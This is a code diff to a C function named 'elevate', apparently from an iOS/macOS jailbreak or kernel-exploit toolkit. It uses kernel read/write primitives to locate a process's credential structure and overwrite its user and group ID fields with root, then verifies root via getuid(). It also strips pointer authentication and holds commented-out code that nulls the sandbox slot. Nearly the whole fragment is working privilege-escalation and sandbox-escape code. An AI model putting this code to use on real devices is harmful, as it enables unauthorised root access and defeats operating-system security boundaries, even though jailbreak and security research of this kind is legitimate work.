@@ -4,7 +4,7 @@
 int elevate(krw_handlers *toolbox, pid_t pid)
 {
     addr64_t myproc = find_pid(toolbox, pid);
-    
+
     addr64_t ucred_s = 0;
 
     if (toolbox->kread(myproc + __ucredOffset, &ucred_s, sizeof(addr64_t)))
@@ -19,15 +19,19 @@ int elevate(krw_handlers *toolbox, pid_t pid)
 
     // set group and user id to 0
     // apparently nullifying all the other kern struct variables isn't required
-    if (toolbox->kwrite(&root, ucred_s + __cr_svuid, sizeof(uint32_t)))
+    if (toolbox->kwrite(&root, ucred_s + __cr_uid, sizeof(uint32_t)) ||
+        toolbox->kwrite(&root, ucred_s + __cr_ruid, sizeof(uint32_t)) ||
+        toolbox->kwrite(&root, ucred_s + __cr_rgid, sizeof(uint32_t)) ||
+        toolbox->kwrite(&root, ucred_s + __cr_svgid, sizeof(uint32_t)) ||
+        toolbox->kwrite(&root, ucred_s + __cr_svuid, sizeof(uint32_t)))
     {
         printf("Ucred writing failed!");
         return 1;
     }
 
-    if (setuid(0) || setgid(0) || !geteuid()) // apparently this just works after nulling __cs_svuid??
+    if (getuid() != 0) // apparently this just works after nulling __cs_svuid??
     {
-        printf("Elevation failed :(\n");
+        printf("Elevation failed :( UID: %d\n", getuid());
         return 1;
     }
 
@@ -41,9 +45,10 @@ int elevate(krw_handlers *toolbox, pid_t pid)
     else
         cs_label_s = STRIP_PAC(cs_label_s);
 
-    printf("%llu", cs_label_s);
+    // printf("nulling at %llu", cs_label_s);
 
-    // if (toolbox->kwrite(&root, cs_label_s + __sandbox_slot, sizeof(uint32_t)))
+    // uint64_t null = 0;
+    // if (toolbox->kwrite(&null, cs_label_s + __sandbox_slot, sizeof(uint64_t)))
     // {
     //     printf("Failed to nullify sandbox slot :(\n");
     //     return 1;
